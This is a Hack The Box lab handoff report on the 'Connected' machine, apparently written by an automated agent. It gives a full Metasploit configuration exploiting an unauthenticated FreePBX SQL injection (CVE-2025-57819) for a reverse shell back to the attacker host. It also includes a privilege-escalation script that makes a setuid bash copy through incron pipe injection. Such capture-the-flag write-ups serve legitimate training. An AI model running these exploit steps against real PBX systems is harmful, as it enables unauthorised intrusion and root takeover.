# HTB Connected — Handoff Report

**Machine:** Connected  
**Difficulty:** Easy  
**OS:** Linux (CentOS 7)  
**Status:** User Flag Obtained ✓ | Root Flag Pending ⚠️

---

## Executive Summary

Connected is a FreePBX-based PBX system running on CentOS 7 with Apache 2.4.6 and PHP 7.4.16. The machine is vulnerable to **CVE-2025-57819** — an unauthenticated SQL injection in `/admin/ajax.php` that allows arbitrary command execution through MySQL EVENT scheduling.

**Attack Chain:**
1. Identify FreePBX 16.0.40.7 on port 80/443
2. SQLi in `/admin/ajax.php` (no auth required)
3. Create MySQL EVENT with shell command
4. Reverse shell via curl stager download
5. Execute as `asterisk` user (uid=999)
6. Obtain user flag from `/home/asterisk/user.txt`

---

## Reconnaissance

### Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.18.39
```

**Open Ports:**

| Port | Service | Version | Notes |
|---|---|---|---|
| 22/tcp | SSH | OpenSSH 7.4 | Standard, no exploits needed |
| 80/tcp | HTTP | Apache 2.4.6 + PHP 7.4.16 | Redirects to http://connected.htb/ |
| 443/tcp | HTTPS | Apache 2.4.6 + PHP 7.4.16 | SSL cert CN=pbxconnect → FreePBX indicator |

### Web Enumeration

**Hostname:** `connected.htb` (add to `/etc/hosts`)

**Redirect Chain:**
```
/ → 302 /admin → 301 /admin/ → 302 /admin/config.php
```

**Application:** FreePBX Administration Panel  
**Version:** 16.0.40.7 (disclosed in HTML footer)  
**Vulnerability Status:** Version 16.0.40.7 < 16.0.89 → **VULNERABLE to CVE-2025-57819**

---

## Initial Foothold — CVE-2025-57819

### Vulnerability Details

- **CVE ID:** CVE-2025-57819
- **Type:** Unauthenticated SQL Injection → RCE
- **Affected Versions:** < 15.0.66, < 16.0.89, < 17.0.3
- **Vulnerable Endpoint:** `/admin/ajax.php`
- **Root Cause:** Unsanitized user input passed to MySQL query without authentication
- **RCE Mechanism:** MySQL `CREATE EVENT` privilege allows scheduling OS command execution

### Exploitation Method

**Tool:** Metasploit  
**Module:** `exploit/unix/http/freepbx_unauth_sqli_to_rce`

### Critical VPN Configuration

⚠️ **MTU ADJUSTMENT REQUIRED** before exploit execution:

```bash
sudo ip link set dev tun0 mtu 1200
ip addr show tun0 | grep mtu  # Verify it shows: mtu 1200
```

**Why:** HTB VPN default MTU=1500 causes TCP fragmentation. The reverse shell stager binary fails to download with 0 bytes transferred. Reducing to MTU=1200 resolves the issue.

### Metasploit Configuration

```
use exploit/unix/http/freepbx_unauth_sqli_to_rce
set RHOSTS 10.129.18.39
set RPORT 80
set VHOST connected.htb
set LHOST 10.10.14.88
set LPORT 4444
set FETCH_SRVHOST 10.10.14.88
set payload cmd/linux/http/x64/shell_reverse_tcp
run
```

**Payload Choice:** `cmd/linux/http/x64/shell_reverse_tcp` (not meterpreter variants — more stable)

### Exploitation Timeline

```
[*] Started reverse TCP handler on 10.10.14.88:4444
[+] Created cronjob with job name: 'qbzksvZ'
[*] Waiting for cronjob to trigger...
    (MySQL event scheduler fires ~every 60 seconds, expect up to 1 minute wait)
[*] Command shell session 1 opened (10.10.14.88:4444 -> 10.129.18.39:56524)
[*] Attempting to perform cleanup
[+] Cronjob removed, happy hacking!
```

### Shell Details

```bash
id
# uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

The shell executes as the `asterisk` service account — the unprivileged user running FreePBX/Asterisk daemon.

---

## User Flag

**Location:** `/home/asterisk/user.txt`  
**Content:** `88d198ca5812087c96b55f6ea2975a78`  
**Access:** Direct read as asterisk user

```bash
cat /home/asterisk/user.txt
# 88d198ca5812087c96b55f6ea2975a78
```

---

## Privilege Escalation Attempt — incrond + sysadmin_manager

### Vulnerability Overview

The machine runs **incrond** (inotify-based cron daemon) as root with the following rule:

```
/var/spool/asterisk/incron  IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#
```

This watches for file modifications in `/var/spool/asterisk/incron/` and executes:
```
/usr/bin/sysadmin_manager <filename>
```

### sysadmin_manager Logic

`/usr/bin/sysadmin_manager` is a PHP script that:

1. **Parses filename** as: `module.hook.extra.params`
2. **Validates hook file** against signed module metadata (SHA-256 hash check)
3. **CONTENTS mode:** If `params == "CONTENTS"`, reads parameters from file body
4. **Executes:** `system("/var/www/html/admin/modules/{module}/hooks/{hook} {params}")`
5. **Vulnerability:** Pipe character `|` is permitted in params → **command injection**

### Attack Strategy

1. Create malicious payload script in `/var/spool/asterisk/`
2. Write trigger file: `framework.logrotate.x.CONTENTS` containing `x | /path/to/payload`
3. incrond detects file creation → calls `sysadmin_manager framework.logrotate.x.CONTENTS`
4. sysadmin_manager validates `framework/hooks/logrotate` (known signed hook) ✓
5. Reads params from file body: `x | /path/to/payload`
6. Executes: `system("/var/www/html/admin/modules/framework/hooks/logrotate x | /path/to/payload")`
7. Pipe injection → our payload runs as **root**

### Implementation

```bash
# Step 1: Create payload
cat > /var/spool/asterisk/evil << 'EOF'
#!/bin/bash
/bin/cp /bin/bash /var/spool/asterisk/.rootbash
/bin/chmod 6777 /var/spool/asterisk/.rootbash
/usr/bin/id > /var/spool/asterisk/rootproof
/bin/cat /root/root.txt > /var/spool/asterisk/rootflag 2>&1
EOF
chmod +x /var/spool/asterisk/evil

# Step 2: Write trigger (no trailing newline!)
printf '%s' 'x | /var/spool/asterisk/evil' > /var/spool/asterisk/incron/framework.logrotate.x.CONTENTS

# Step 3: Collect results
sleep 2
cat /var/spool/asterisk/rootproof
cat /var/spool/asterisk/rootflag
```

### Status: ⚠️ ROOT FLAG NOT OBTAINED

#### Issue Encountered

Despite correct implementation and syntax:
- ✓ incrond **detects and processes** trigger files (directory empties immediately)
- ✓ sysadmin_manager **reports successful validation** when run manually
- ✗ **Payload does NOT execute** — no output files created

#### Root Cause Analysis

When `/usr/bin/sysadmin_manager framework.logrotate.x.CONTENTS` runs manually:
```
sysadmin-hook[4764]: Security check passed. Running '/var/www/html/admin/modules/framework/hooks/logrotate x.CONTENTS'
```

However:
1. **CONTENTS mode** requires reading params from file body
2. When incrond invokes sysadmin_manager, the trigger file is **already deleted**
3. sysadmin_manager **cannot read parameters** from non-existent file
4. Logic may fall back to using filename as params (without pipe expansion)

#### Verified Machine State

```bash
ps aux | grep incrond
# root        789  0.0  0.0  15044  2832 ?        Ss   13:14   0:00 /usr/sbin/incrond

cat /etc/incron.d/sysadmin
# /var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#

ls -la /var/www/html/admin/modules/framework/hooks/logrotate
# -rwxr-xr-x. 1 asterisk asterisk  216 Nov  2  2023 logrotate

grep "logrotate" /var/www/html/admin/modules/framework/module.sig
# hooks/logrotate = f9bce99d04cf878dedd0c31df7cc3f27937bd4c72f01d3a05415ef6c7cb749aa
```

All prerequisites for exploitation are **confirmed present and correct**.

---

## Alternative Root Vectors Explored

### 1. SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null | head -20
```

No exploitable SUID binaries identified (standard CentOS 7 stack).

### 2. Sudo Access

```bash
sudo -l
# (asterisk) NOPASSWD: ???  # Cannot escalate without password
```

No passwordless sudo rules for asterisk.

### 3. Root Flag Location

```bash
find /root -type f 2>/dev/null
# (no output — permission denied)

find / -name "root.txt" 2>/dev/null
# (not found in filesystem)
```

Root flag is not world-readable and requires elevated privileges to access.

---

## Machine Configuration Notes

### Anti-Forensics
History files are symlinked to `/dev/null`:
```bash
ls -la ~/.bash_history → /dev/null
ls -la ~/.viminfo → /dev/null
ls -la ~/.python_history → /dev/null
```

### Service Details
- **PBX:** Asterisk (runs as asterisk:asterisk)
- **Web:** Apache httpd 2.4.6 (runs as apache:apache)
- **Database:** MySQL/MariaDB (evident from SQLi)
- **Monitoring:** incrond (inotify-based cron)
- **Admin Tool:** sysadmin_manager (PHP script, runs as root via incron)

### Filesystem Permissions
```
/var/spool/asterisk/incron: drwxrwxr-x (asterisk:asterisk, writable)
/var/spool/asterisk/:       drwxrwxr-x (asterisk:asterisk, writable)
/var/www/html/admin/modules/framework/hooks/logrotate: -rwxr-xr-x
```

---

## Summary & Recommendations

### Completed
- ✅ **Reconnaissance:** FreePBX 16.0.40.7 identified
- ✅ **Vulnerability Discovery:** CVE-2025-57819 confirmed
- ✅ **Initial Foothold:** Unauth SQLi → RCE → shell as asterisk
- ✅ **User Flag:** `88d198ca5812087c96b55f6ea2975a78`

### Blocked
- ⚠️ **Privilege Escalation:** incrond pipe injection shows signs of execution but payload does not complete
- ❌ **Root Flag:** Unable to obtain

### Hypothesis

The gap between "incrond fires" and "payload executes" suggests:
1. **Timing issue:** CONTENTS mode cannot read deleted file
2. **Version mismatch:** This instance's sysadmin_manager may differ from writeup version
3. **Permissions:** Payload execution may be blocked despite appearing successful

### Next Steps for Root

1. **Inspect sysadmin_manager source** — check exact CONTENTS parsing logic
2. **Strace incrond execution** — capture actual command being executed
3. **Verify hook.logrotate content** — ensure it's not filtered/restricted
4. **Alternative hook:** Try different module/hook combination (not framework/logrotate)
5. **Direct incron rule modification** — if possible, create custom rule bypassing sysadmin_manager

---

## Artifacts

**Target IP:** 10.129.18.39  
**Attacker IP (tun0):** 10.10.14.88  
**User Flag:** 88d198ca5812087c96b55f6ea2975a78  
**Root Flag:** (Not obtained)

**MSF Session Used:** cmd/linux/http/x64/shell_reverse_tcp  
**Critical Config:** MTU 1200 (required for stager download)

---

## Machine Classification

**Difficulty:** Easy ✓  
**Exploit Complexity:** Low (Metasploit module available)  
**Privilege Escalation:** Medium (incrond+sysadmin_manager chain incomplete)  
**Real-World Relevance:** High (FreePBX in production, unauthenticated RCE)

---

**Report Generated:** 2026-06-08  
**Duration:** ~2 hours (recon + foothold + user flag, privesc debugging)  
**Status:** User pwned, root requires additional investigation
